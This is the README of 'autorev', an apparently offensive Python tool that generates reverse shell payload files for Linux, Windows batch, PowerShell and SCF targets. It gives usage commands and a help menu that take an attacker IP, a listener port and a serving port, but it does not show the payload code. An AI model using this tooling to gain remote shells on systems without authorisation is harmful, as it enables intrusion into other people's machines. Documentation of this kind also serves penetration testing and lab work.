<div align="center">

# Autorev.sh
  
![banner](https://github.com/root-tanishq/autorev.sh/raw/main/images/autorev_banner.png) 

The Python Script will generate a (.) extension file with reverse shell codes then you can execute the script on the target [support windows and linux both]

# Usage

## Generating linux
  
<div align="left">

```
python3 <path to autorev>/autorev.py -i 192.168.1.1 -p 443 -s 8000
```

<div align="center">
  
![linux](https://github.com/root-tanishq/autorev.sh/raw/main/images/autorev_lin.png)  

## Generating Windows bat

<div align="left">
  
```
python3 <path to autorev>/autorev.py -i 192.168.1.1 -p 443 -s 8000 -f winc
```

![winc](https://github.com/root-tanishq/autorev.sh/raw/main/images/autorev_winc.png)  

<div align="center">
  
## Generating Windows ps1
  
<div align="left">

```
python3 <path to autorev>/autorev.py -i 192.168.1.1 -p 443 -s 8000 -f winp
```

![winp](https://github.com/root-tanishq/autorev.sh/raw/main/images/autorev_winp.png)

<div align="center">
  
### Generating SCF
  
<div align="left">

```
python3 autorev.sh -i <your-ip> -p <your-port> -o <scf-file-name> -f scf
```

![scf generator](https://github.com/root-tanishq/autorev.sh/raw/main/images/autorev_scf.png) 

<div align="center">
  
> All Usage commands will be also generated and print according to the given switches

## HELP Menu
  
<div align="left">

```
-h,        --help   HELP   show this help message and exit
-i IPADDR, --ipaddr IPADDR LHOST Attacker IP address
-p PORT,   --port   PORT   LPORT Port to get reverse shell on [Default 9001]
-o OUT,    --out    OUT    Output File Name [Excluding (.)extension Extension][OPTIONAL]
-f FORMAT, --format FORMAT Define Format for generator [lin | win[c/p](c = cmd | p = powershell) | scf][Default=lin]
-s SERVER, --server SERVER Port to use for generating commands (http://[your-ip]:[PORT]) (Default 80)
```
  
![help menu](https://github.com/root-tanishq/autorev.sh/raw/main/images/autorev_help.png)
  
